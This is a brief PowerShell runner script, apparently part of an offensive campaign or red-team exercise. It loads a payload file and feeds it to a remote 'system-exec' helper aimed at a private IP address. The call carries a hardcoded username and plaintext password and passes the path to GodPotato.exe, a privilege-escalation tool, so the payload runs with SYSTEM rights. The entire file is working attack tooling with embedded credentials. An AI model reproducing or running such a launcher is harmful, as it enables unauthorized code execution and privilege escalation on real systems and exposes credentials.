# Runner v2: feed payload2 to system-exec helper
$ErrorActionPreference = 'Continue'
$payload = Get-Content 'C:\Tools\wt035g-mbr01-payload2.ps1' -Raw
& 'C:\Tools\campaign-a-t043-system-exec.ps1' -Server '192.168.77.22' -Username 'analyst_t1' -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock $payload
Write-Output 'RUNNER2_DONE'
